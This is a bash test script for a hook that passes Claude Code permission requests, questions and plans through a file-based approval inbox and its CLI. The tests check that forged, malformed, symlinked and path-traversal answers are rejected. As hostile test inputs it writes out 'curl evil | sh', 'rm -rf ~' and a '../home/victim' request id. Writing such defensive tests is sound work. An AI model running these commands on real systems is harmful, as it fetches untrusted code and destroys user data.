#!/usr/bin/env bash
# Smallest check that fails if the approval inbox breaks: hooks/inbox.sh puts a Claude Code permission request in the
# inbox and turns the answer the forgerdr mod writes into Claude Code's decision, or leaves without one when the pane
# answered first; bin/forge-inbox.sh lists the requests for the mod and writes its answers.
# Run: bash test/inbox.test.sh
set -euo pipefail
root="$(cd "$(dirname "$0")/.." && pwd)"
hook="$root/hooks/inbox.sh"
sandbox="$(mktemp -d)"
trap 'rm -rf "$sandbox"' EXIT
# shellcheck source=test/fakes.sh
. "$root/test/fakes.sh"
fakes_install "$sandbox"
export FORGE_INBOX_DIR="$sandbox/inbox" FORGE_INBOX_PAUSE=0.05
inbox="$FORGE_INBOX_DIR"

failures=0
expect() {
  if [ "$2" = "$3" ]; then printf 'ok   %s\n' "$1"; else printf 'FAIL %s\n  expected: %s\n  actual:   %s\n' "$1" "$2" "$3"; failures=$((failures + 1)); fi
}

# Requests as Claude Code sends them to PermissionRequest.
push='{"session_id":"s1","cwd":"/work","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"git push -u origin HEAD","description":"Publish the branch"},"permission_suggestions":[]}'
pushed='{"session_id":"s1","tool_name":"Bash","tool_input":{"description":"Publish the branch","command":"git push -u origin HEAD"},"tool_use_id":"toolu_1","tool_response":{"stdout":""}}'
question='{"session_id":"s1","cwd":"/work","tool_name":"AskUserQuestion","tool_input":{"questions":[{"question":"Where should a pane keep its zoom?","header":"Zoom","options":[{"label":"per pane","description":"Each pane keeps its own"},{"label":"global","description":"One zoom for all"}],"multiSelect":false}]}}'
gate='{"session_id":"s1","cwd":"/work","tool_name":"AskUserQuestion","tool_input":{"questions":[{"question":"Commit feat: add the inbox?","header":"Gate commit","options":[{"label":"Commit","description":"As drafted"},{"label":"Not yet","description":"Keep working"}],"multiSelect":false}]}}'
plan='{"session_id":"s1","cwd":"/work","permission_mode":"plan","agent_type":"Plan","tool_name":"ExitPlanMode","tool_input":{"plan":"# Plan\n1. Wire the inbox","planFilePath":"/plans/p.md"}}'

# The hook asking, as the session in herdr terminal t7, in the background: its pid in pids[n], its output in out.<n>.
asked=0
pids=()
asking() {
  asked=$((asked + 1))
  printf '%s' "$1" | HC_TERMINAL_ID=t7 bash "$hook" ask > "$sandbox/out.$asked" &
  pids[asked]=$!
}
# The requests in the inbox, once there are as many as $1 (one by default): their ids, oldest first.
requests() {
  local found
  for _ in $(seq 1 100); do
    found="$(find "$inbox" -name '????????????????.json' 2>/dev/null | wc -l | tr -d ' ')"
    [ "$found" -lt "${1:-1}" ] || {
      for file in "$inbox"/????????????????.json; do jq -r '"\(.created) \(.id)"' "$file" 2>/dev/null || true; done |
        sort -n | cut -d' ' -f2
      return
    }
    sleep 0.05
  done
  return 1
}
# Writes an answer to request $1 and waits for the last asker to leave.
answer() {
  printf '%s' "$2" > "$inbox/$1.answer.json"
  wait "${pids[asked]}"
}
# What the last asker told Claude Code: the event and its decision, or nothing.
decision() { [ ! -s "$sandbox/out.$asked" ] || jq -c '.hookSpecificOutput | [.hookEventName, .decision]' "$sandbox/out.$asked"; }
still_waiting() { sleep 0.3; kill -0 "${pids[asked]}" 2>/dev/null && echo yes || echo no; }
settling() { printf '%s' "$2" | HC_TERMINAL_ID="$1" bash "$hook" settle; }

# Outside herdr nothing is asked: Claude Code's own dialog is the only one.
printf '%s' "$push" | bash "$hook" ask > "$sandbox/outside"
expect "outside herdr the hook says nothing" "" "$(cat "$sandbox/outside")"
expect "and puts nothing in the inbox" "no" "$([ -e "$inbox" ] && echo yes || echo no)"

asking "$push"
id="$(requests)"
expect "a permission request goes to the inbox, the session's terminal with it" \
  '{"kind":"permission","terminal":"t7","session_id":"s1","agent_type":"","cwd":"/work","tool_name":"Bash","tool_input":{"command":"git push -u origin HEAD","description":"Publish the branch"}}' \
  "$(jq -c '{kind, terminal, session_id, agent_type, cwd, tool_name, tool_input}' "$inbox/$id.json")"
expect "its id names its file" "$id" "$(jq -r '.id' "$inbox/$id.json")"
expect "the inbox is the user's alone" "1" "$(find "$inbox" -maxdepth 0 -perm 700 | wc -l | tr -d ' ')"
answer "$id" '{"behavior":"allow"}'
expect "allowed in the inbox, Claude Code is told allow" '["PermissionRequest",{"behavior":"allow"}]' "$(decision)"
expect "and the request and its answer go" "" "$(ls "$inbox")"

asking "$push"
id="$(requests)"
answer "$id" '{"behavior":"deny","message":"push only after \"the review\" round"}'
expect "denied with a reason, Claude is told it comes from the user" \
  '["PermissionRequest",{"behavior":"deny","message":"The user denied this from the forgerdr inbox: push only after \"the review\" round"}]' \
  "$(decision)"

asking "$push"
id="$(requests)"
answer "$id" '{"behavior":"deny"}'
expect "denied with no reason, still from the user" \
  '["PermissionRequest",{"behavior":"deny","message":"The user denied this from the forgerdr inbox."}]' "$(decision)"

asking "$question"
id="$(requests)"
expect "a question is a question" "question" "$(jq -r '.kind' "$inbox/$id.json")"
answer "$id" '{"behavior":"allow","answers":{"Where should a pane keep its zoom?":"per pane, but\nreset on restart"}}'
expect "its answers go back with its questions, free text too" \
  '["PermissionRequest",{"behavior":"allow","updatedInput":{"questions":[{"question":"Where should a pane keep its zoom?","header":"Zoom","options":[{"label":"per pane","description":"Each pane keeps its own"},{"label":"global","description":"One zoom for all"}],"multiSelect":false}],"answers":{"Where should a pane keep its zoom?":"per pane, but\nreset on restart"}}}]' \
  "$(decision)"

asking "$gate"
id="$(requests)"
expect "a question headed Gate is one of forgerdr's gates" "gate" "$(jq -r '.kind' "$inbox/$id.json")"
answer "$id" '{"behavior":"deny","message":"not before the review"}'
expect "declined, Claude is told the user declined" \
  '["PermissionRequest",{"behavior":"deny","message":"The user declined to answer from the forgerdr inbox: not before the review"}]' \
  "$(decision)"

asking "$plan"
id="$(requests)"
expect "a plan is a plan, with the agent that wrote it" "plan Plan" "$(jq -r '"\(.kind) \(.agent_type)"' "$inbox/$id.json")"
answer "$id" '{"behavior":"allow","mode":"auto"}'
expect "approved, the plan goes back as it came and the session takes the mode picked" \
  '["PermissionRequest",{"behavior":"allow","updatedInput":{"plan":"# Plan\n1. Wire the inbox","planFilePath":"/plans/p.md"},"updatedPermissions":[{"type":"setMode","mode":"auto","destination":"session"}]}]' \
  "$(decision)"

asking "$plan"
id="$(requests)"
answer "$id" '{"behavior":"deny","message":"name the file plan7.txt"}'
expect "sent back, Claude is told what to change" \
  '["PermissionRequest",{"behavior":"deny","message":"The user wants changes to the plan, from the forgerdr inbox: name the file plan7.txt"}]' \
  "$(decision)"

# Anything can write in the inbox: an answer that is not one the request takes is thrown away, and the hook waits on.
asking "$push"
id="$(requests)"
for wrong in '{"behavior":"allow","answers":{"x":"y"}}' '{"behavior":"maybe"}' '{"behavior":"allow","mode":"auto"}' 'not json' \
  '{"behavior":"deny","message":7}' '{"behavior":"allow","updatedInput":{"command":"rm -rf ~"}}'; do
  printf '%s' "$wrong" > "$inbox/$id.answer.json"
  expect "a wrong answer is ignored: $wrong" "yes" "$(still_waiting)"
  expect "and thrown away: $wrong" "no" "$([ -e "$inbox/$id.answer.json" ] && echo yes || echo no)"
done
printf '%s' '{"behavior":"allow"}' > "$sandbox/elsewhere.json"
ln -s "$sandbox/elsewhere.json" "$inbox/$id.answer.json"
expect "an answer that is a link is ignored" "yes" "$(still_waiting)"
answer "$id" '{"behavior":"allow"}'
expect "the right answer still wins" '["PermissionRequest",{"behavior":"allow"}]' "$(decision)"

asking "$question"
id="$(requests)"
printf '%s' '{"behavior":"allow","answers":{"Something else?":"yes"}}' > "$inbox/$id.answer.json"
expect "answers to questions it did not ask are ignored" "yes" "$(still_waiting)"
printf '%s' '{"behavior":"allow","answers":{"Where should a pane keep its zoom?":7}}' > "$inbox/$id.answer.json"
expect "an answer that is not text is ignored" "yes" "$(still_waiting)"
answer "$id" '{"behavior":"deny"}'

# Answered in the pane, the tool runs and the request is settled: its hook leaves without a decision.
asking "$push"
id="$(requests)"
settling t8 "${pushed/\"s1\"/\"s2\"}"
expect "another session's call settles nothing" "yes" "$(still_waiting)"
settling t7 "$pushed"
wait "${pids[asked]}"
expect "the same call settles it, and its hook says nothing" "" "$(decision)"
expect "the request goes" "" "$(ls "$inbox")"

asking "$push"
id="$(requests)"
settling t7 '{"session_id":"s1","tool_name":"Bash","tool_input":{"command":"ls","description":"List"}}'
expect "another call of the same tool settles nothing" "yes" "$(still_waiting)"
answer "$id" '{"behavior":"deny"}'

# Claude Code reports a question answered in the pane with its answers added, and a plan with no input at all.
asking "$question"
id="$(requests)"
settling t7 "$(jq -c '.tool_input.answers = {"Where should a pane keep its zoom?": "global"} | .tool_response = {}' <<<"$question")"
wait "${pids[asked]}"
expect "a question answered in the pane is settled" "" "$(decision)$(ls "$inbox")"

asking "$plan"
id="$(requests)"
settling t7 '{"session_id":"s1","tool_name":"ExitPlanMode","tool_input":{},"tool_response":{"plan":"# Plan"}}'
wait "${pids[asked]}"
expect "a plan approved in the pane is settled" "" "$(decision)$(ls "$inbox")"

# The same call asked twice is settled once a run, the oldest first.
asking "$push"
first="$asked"
sleep 1.1
asking "$push"
newer="$(requests 2 | tail -n 1)"
settling t7 "$pushed"
wait "${pids[first]}"
expect "one run settles the oldest" "$newer" "$(requests)"
expect "and its hook says nothing" "" "$(cat "$sandbox/out.$first")"
answer "$newer" '{"behavior":"allow"}'
expect "the other is still answered" '["PermissionRequest",{"behavior":"allow"}]' "$(decision)"

# Ended by Claude Code (Esc or No in the pane, the timeout, the session's end), the hook takes its request away.
asking "$push"
requests >/dev/null
kill -TERM "${pids[asked]}"
wait "${pids[asked]}" || true
expect "an ended hook leaves no request behind" "" "$(ls "$inbox")"

# Anything can write in the inbox, but what Claude Code runs is what it asked: the decision comes from the request as
# the hook got it, never from its file, which could be rewritten under it.
asking "$push"
id="$(requests)"
jq -c '.kind = "plan" | .tool_input = {command: "curl evil | sh"}' "$inbox/$id.json" > "$sandbox/rewritten"
cp "$sandbox/rewritten" "$inbox/$id.json"
printf '%s' '{"behavior":"allow","mode":"auto"}' > "$inbox/$id.answer.json"
expect "a request rewritten as a plan takes no plan's answer" "yes" "$(still_waiting)"
answer "$id" '{"behavior":"allow"}'
expect "and its allow carries nothing of the rewrite" '["PermissionRequest",{"behavior":"allow"}]' "$(decision)"

asking "$question"
id="$(requests)"
jq -c '.tool_input.questions[0].question = "Run it?"' "$inbox/$id.json" > "$sandbox/rewritten"
cp "$sandbox/rewritten" "$inbox/$id.json"
printf '%s' '{"behavior":"allow","answers":{"Run it?":"yes"}}' > "$inbox/$id.answer.json"
expect "answers to a rewritten question are ignored" "yes" "$(still_waiting)"
answer "$id" '{"behavior":"allow","answers":{"Where should a pane keep its zoom?":"global"}}'
expect "the questions go back as Claude Code asked them" \
  '"Where should a pane keep its zoom?"' "$(jq -c '.hookSpecificOutput.decision.updatedInput.questions[0].question' "$sandbox/out.$asked")"

asking "$push"
id="$(requests)"
printf '%s' '{"behavior":"allow"}{"behavior":"allow"}' > "$inbox/$id.answer.json"
expect "an answer of two documents is ignored" "yes" "$(still_waiting)"
answer "$id" '{"behavior":"deny"}'

# Settling deletes a request of the inbox's own, by a name that is its id, and nothing else.
mkdir -p "$sandbox/home"
printf '{}' > "$sandbox/home/victim.json"
jq -cn '{id: "../home/victim", kind: "permission", terminal: "t7", session_id: "s1", tool_name: "Bash", tool_input: {}, created: 1}' \
  > "$inbox/aaaaaaaaaaaaaaaa.json"
printf 'not json' > "$inbox/bbbbbbbbbbbbbbbb.json"
jq -cn '{id: "cccccccccccccccc", kind: "permission", terminal: "t7", session_id: "s1", tool_name: "Bash", tool_input: "x", created: 1}' \
  > "$inbox/cccccccccccccccc.json"
asking "$push"
id="$(requests 4 | grep -E '^[0-9a-f]{16}$' | grep -v -E 'aaaaaaaaaaaaaaaa|cccccccccccccccc')"
settling t7 "$pushed"
wait "${pids[asked]}"
expect "a file that names another request is never what settling deletes" "yes" "$([ -e "$sandbox/home/victim.json" ] && echo yes || echo no)"
expect "and a broken file, or one whose input is not an object, stops no settling" "" "$(decision)$([ -e "$inbox/$id.json" ] && echo "$id still waits")"
rm -f "$inbox/aaaaaaaaaaaaaaaa.json" "$inbox/bbbbbbbbbbbbbbbb.json" "$inbox/cccccccccccccccc.json"

# Twin requests a moment apart are told apart: the hook keeps when, to the millisecond.
before_ms="$(node -e 'console.log(Date.now())')"
asking "$push"
id="$(requests)"
after_ms="$(node -e 'console.log(Date.now())')"
expect "a request keeps when it came to the millisecond" "yes" \
  "$(jq -r --argjson before "$before_ms" --argjson after "$after_ms" 'if .created >= $before and .created <= $after then "yes" else "no \(.created)" end' "$inbox/$id.json")"
answer "$id" '{"behavior":"deny"}'

# Outside herdr, settling is nothing either.
asking "$push"
id="$(requests)"
printf '%s' "$pushed" | bash "$hook" settle
expect "outside herdr nothing is settled" "yes" "$(still_waiting)"
answer "$id" '{"behavior":"deny"}'

# A turn that ends on a question typed in the chat, which the inbox never sees, goes back once to ask it with
# AskUserQuestion. Stop's input as Claude Code sends it: $1 the final message, $2 whether a stop hook already sent it
# back.
stop_input() {
  jq -cn --arg message "$1" --argjson active "${2:-false}" \
    '{session_id: "s1", cwd: "/work", hook_event_name: "Stop", stop_hook_active: $active, last_assistant_message: $message}'
}
stopping() { stop_input "$@" | HC_TERMINAL_ID=t7 bash "$hook" stop; }
typed="$(printf 'Two ways to keep the zoom.\n\nWhich one do you want?')"
sent_back="$(stopping "$typed")"
expect "a turn that ends on a question typed in the chat goes back, one decision and nothing else" \
  '[["decision","reason"]]' "$(jq -cs 'map(keys)' <<<"$sent_back")"
expect "it blocks the stop" "block" "$(jq -r '.decision' <<<"$sent_back")"
expect "and tells Claude to ask it with AskUserQuestion" "yes" \
  "$(jq -r '.reason | if startswith("Your turn ended on a question typed in the chat") and contains("AskUserQuestion") then "yes" else "no" end' <<<"$sent_back")"
expect "outside herdr it goes nowhere" "" "$(stop_input "$typed" | bash "$hook" stop)"
expect "sent back once, never twice" "" "$(stopping "$typed" true)"
expect "an agent forgerdr dispatched asks the session that dispatched it instead" "" \
  "$(stop_input "$typed" | HC_TERMINAL_ID=t7 FORGE_REPORT_TO=uds:/tmp/parent.sock bash "$hook" stop)"
# shellcheck disable=SC2016 # inline code, not expansions
coded="$(printf '%s\n' 'Ran the search.' '```sh' 'grep -q "a?" notes?' '```' '~~~' 'Still waiting?' '~~~' \
  'The pattern is `a?`' 'Results at https://example.com/search?q' 'See https://example.com/a?b=c.' 'Kept `x?` and `y?`')"
expect "a question mark in a code block, inline code or a link asks nothing" "" "$(stopping "$coded")"
expect "a question that ends in a link still asks" "block" "$(stopping 'Opened https://example.com/search?' | jq -r '.decision')"
expect "and one whose link is in brackets" "block" "$(stopping 'Open the pull request (https://example.com/p/1)?' | jq -r '.decision')"
# shellcheck disable=SC2016 # fences, not expansions
{
  expect "a tilde fence inside a backtick block closes nothing" "" "$(stopping "$(printf '%s\n' '```' '~~~' 'Still code?' '```' 'Done.')")"
  expect "an unclosed fence asks nothing" "" "$(stopping "$(printf '%s\n' 'Done.' '```' 'Still code?')")"
  expect "a four-backtick block holding a three-backtick one asks nothing" "" \
    "$(stopping "$(printf '%s\n' 'Example:' '````md' '```sh' 'ls?' '```' '````' 'Done.')")"
  expect "a fence line with more after it closes nothing" "" "$(stopping "$(printf '%s\n' '```' '```sh' 'ls?' '```' 'Done.')")"
  expect "a message with CRLF line ends asks too" "block" "$(stopping "$(printf '```\r\nls\r\n```\r\nWhich one?\r\n')" | jq -r '.decision')"
  expect "a line that starts with inline code opens no fence" "block" "$(stopping '```ls``` failed. Retry?' | jq -r '.decision')"
  expect "a fence with an info string still opens" "" "$(stopping "$(printf '%s\n' 'Run:' '```sh' 'ls?' '```' 'Done.')")"
  expect "and a tilde fence with backticks in its info" "" "$(stopping "$(printf '%s\n' 'Run:' '~~~ `x`' 'ls?' '~~~' 'Done.')")"
}
expect "a report asks nothing" "" "$(stopping 'Tests pass. Branch pushed.')"
expect "a question with closing marks after it still asks" "block" \
  "$(stopping "$(printf 'Two ways.\n\n**Which one?** ')" | jq -r '.decision')"
expect "a full-width question mark asks too" "block" "$(stopping "$(printf 'Two ways.\n\n(Which one？)')" | jq -r '.decision')"
expect "full-width brackets close a question too" "block" "$(stopping "$(printf 'Two ways.\n\n（Which one？）')" | jq -r '.decision')"
expect "a question with more after it on its line asks nothing" "" "$(stopping 'Which one? The first, as before.')"
expect "a question asked before the end of the message still asks" "block" \
  "$(stopping "$(printf 'Which one do you want?\n\nBoth are ready.')" | jq -r '.decision')"
expect "malformed input never fails the hook" "0" "$(printf 'not json' | HC_TERMINAL_ID=t7 bash "$hook" stop 2>/dev/null; echo $?)"
expect "and says why on stderr" "yes" "$(printf 'not json' | HC_TERMINAL_ID=t7 bash "$hook" stop 2>&1 >/dev/null | grep -q . && echo yes || echo no)"
expect "nor input of another shape" "0" "$(printf '7' | HC_TERMINAL_ID=t7 bash "$hook" stop 2>&1; echo $?)"
expect "nor two documents, even both asking" "0" "$({ stop_input "$typed"; stop_input "$typed"; } | HC_TERMINAL_ID=t7 bash "$hook" stop 2>&1; echo $?)"
# A long message goes through a pipe: Linux caps one argument at 128 KiB.
started="$(node -e 'console.log(Date.now())')"
judged="$({ seq 1 10000 | sed 's/.*/Line & of the report./'; echo 'Which one?'; } |
  jq -Rsc '{hook_event_name: "Stop", stop_hook_active: false, last_assistant_message: .}' |
  HC_TERMINAL_ID=t7 bash "$hook" stop | jq -r '.decision')"
took=$(($(node -e 'console.log(Date.now())') - started))
expect "a long message is judged" "block" "$judged"
expect "well within the hook's 5 s timeout" "yes" "$([ "$took" -lt 5000 ] && echo yes || echo "no, $took ms")"
# One line of 10 000 inline code spans and links, ended by $1, through a pipe as above: its decision, and whether it
# came within the hook's 5 s timeout. jq's gsub takes time quadratic in its matches on one line.
# shellcheck disable=SC2016 # inline code, not expansions
dense_line() {
  local started took decision
  started="$(node -e 'console.log(Date.now())')"
  decision="$({ seq 1 10000 | sed 's|.*|`a` https://x.io/a|' | tr '\n' ' '; echo "$1"; } |
    jq -Rsc '{hook_event_name: "Stop", stop_hook_active: false, last_assistant_message: .}' |
    HC_TERMINAL_ID=t7 bash "$hook" stop | jq -r '.decision')"
  took=$(($(node -e 'console.log(Date.now())') - started))
  if [ "$took" -lt 5000 ]; then echo "${decision:-nothing} in time"; else echo "${decision:-nothing} in $took ms"; fi
}
expect "a long line of inline code and links that ends asking is judged in time" "block in time" "$(dense_line 'Which one?')"
expect "and one that ends otherwise" "nothing in time" "$(dense_line 'Both are ready.')"
# Only a line's end is read: inline code that opens before the cut and closes after it neither hides a question nor
# makes one up.
code="$(printf 'x%.0s' $(seq 1 3000))"
expect "a question between long inline code and more inline code still asks" "block" \
  "$(stopping "\`$code\` Which one? \`x\`" | jq -r '.decision')"
expect "and a question inside long inline code asks nothing" "" "$(stopping "\`$code Which one? \`x\`" | jq -r '.decision')"

# The mod's side: bin/forge-inbox.sh lists what waits and writes its answers.
cli="$root/bin/forge-inbox.sh"
rm -rf "$inbox"
expect "an inbox never used lists nothing" "[]" "$(bash "$cli" list)"
expect "and is made the user's alone" "1" "$(find "$inbox" -maxdepth 0 -perm 700 | wc -l | tr -d ' ')"
now_ms=$(($(date +%s) * 1000))
waiting() { jq -cn --arg id "$1" --argjson created "$2" --arg command "$3" '{id: $id, kind: "permission", terminal: "t7", session_id: "s1", tool_name: "Bash", tool_input: {command: $command}, created: $created}' > "$inbox/$1.json"; }
waiting 00000000000000b2 "$((now_ms - 5000))" "pnpm test"
waiting 00000000000000a1 "$((now_ms - 60000))" "git push"
waiting 00000000000000c3 "$((now_ms - 86400000))" "a day old"
waiting 00000000000000d4 "$now_ms" "$(printf 'x%.0s' $(seq 1 20005))"
waiting 00000000000000e5 "$now_ms" "named for another"
jq '.id = "00000000000000a1"' "$inbox/00000000000000e5.json" > "$sandbox/forged" && mv "$sandbox/forged" "$inbox/00000000000000e5.json"
printf 'not json' > "$inbox/00000000000000f6.json"
printf '{"behavior":"allow"}' > "$inbox/00000000000000a1.answer.json"
listed="$(bash "$cli" list)"
expect "what waits is listed oldest first, a broken file or one named for another request skipped" \
  "00000000000000a1 00000000000000b2 00000000000000d4" "$(jq -r 'map(.id) | join(" ")' <<<"$listed")"
expect "a request a day old goes: its hook has given up" "no" "$([ -e "$inbox/00000000000000c3.json" ] && echo yes || echo no)"
expect "a long text is cut" "20001 …" "$(jq -r '.[2].tool_input.command | "\(length) \(.[-1:])"' <<<"$listed")"
expect "and its request says so, so it is not approved unseen" "true false" "$(jq -r '"\(.[2].cut) \(.[1].cut)"' <<<"$listed")"
expect "a request lists as its hook wrote it" '{"id":"00000000000000b2","kind":"permission","terminal":"t7","session_id":"s1","tool_name":"Bash","tool_input":{"command":"pnpm test"},"cut":false}' \
  "$(jq -c '.[1] | del(.created)' <<<"$listed")"
for shape in '.kind = "vote"' '.tool_input = "rm"' '.tool_name = 7' '.kind = "question" | .tool_input = {questions: [{question: "Which?"}]}' \
  '.kind = "gate" | .tool_input = {questions: [{question: "Commit?", header: 5, options: [{label: "Commit"}]}]}' \
  '.kind = "question" | .tool_input = {questions: [{question: "Which?", options: [{label: "a", preview: ["x"]}]}]}' \
  '.kind = "question" | .tool_input = {questions: [{question: "Which?", multiSelect: "yes", options: [{label: "a"}]}]}'; do
  jq -c "$shape" "$inbox/00000000000000b2.json" > "$inbox/00000000000000f7.json"
  jq '.id = "00000000000000f7"' "$inbox/00000000000000f7.json" > "$sandbox/shaped" && mv "$sandbox/shaped" "$inbox/00000000000000f7.json"
  expect "a request of another shape is skipped: $shape" "no" "$(bash "$cli" list | jq -r 'any(.id == "00000000000000f7") | if . then "yes" else "no" end')"
done
rm -f "$inbox/00000000000000f7.json"
printf '{"behavior":"allow"}' > "$inbox/0000000000000099.answer.json"
bash "$cli" list >/dev/null
expect "an answer whose request is gone is cleared" "no" "$([ -e "$inbox/0000000000000099.answer.json" ] && echo yes || echo no)"

bash "$cli" answer 00000000000000b2 '{"behavior":"deny","message":"use pnpm test:unit"}' >/dev/null
expect "an answer is written for its request's hook" '{"behavior":"deny","message":"use pnpm test:unit"}' "$(cat "$inbox/00000000000000b2.answer.json")"
expect "and nothing is left half written" "" "$(find "$inbox" -name '*.tmp')"
for wrong in "../00000000000000b2" "00000000000000B2" "0000000000000099" ""; do
  expect "no answer for a request that is not there: '$wrong'" "1" "$(bash "$cli" answer "$wrong" '{"behavior":"allow"}' >/dev/null 2>&1; echo $?)"
done
expect "an answer must be a JSON object" "1" "$(bash "$cli" answer 00000000000000d4 'allow' >/dev/null 2>&1; echo $?)"
expect "and one only" "1" "$(bash "$cli" answer 00000000000000d4 '{"behavior":"allow"}{"behavior":"allow"}' >/dev/null 2>&1; echo $?)"
expect "none of those were written" "00000000000000a1.answer.json 00000000000000b2.answer.json" "$(cd "$inbox" && echo ./*.answer.json | sed 's#\./##g')"

[ "$failures" -eq 0 ] || { printf '%s failure(s)\n' "$failures"; exit 1; }
printf 'all good\n'
